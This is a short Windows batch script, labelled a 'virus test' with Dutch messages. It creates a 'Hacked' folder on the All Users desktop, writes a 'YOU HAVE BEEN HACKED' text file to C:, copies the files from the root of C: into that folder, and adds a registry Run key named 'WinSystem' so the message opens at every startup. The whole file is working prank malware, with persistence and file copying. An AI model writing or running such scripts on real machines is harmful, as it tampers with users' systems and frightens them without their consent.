@echo off
c:
cd\
cd documents and settings
cd all users
cd bureaublad
md Hacked
cd Hacked
@echo *** YOU HAVE BEEN HACKED, VIRUS TEST *** | find /v "('" >>c:\hacked.txt
@echo *** Er konden gegevens worden gekopieerd naar externe locaties *** | find /v "('" >>c:\hacked.txt
@echo *** Er staan nu gekopieerde gegevens op het bureublad in de map "Hacked" | find /v "('" >>c:\hacked.txt
copy c:\*.*
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinSystem /d C:\hacked.txt

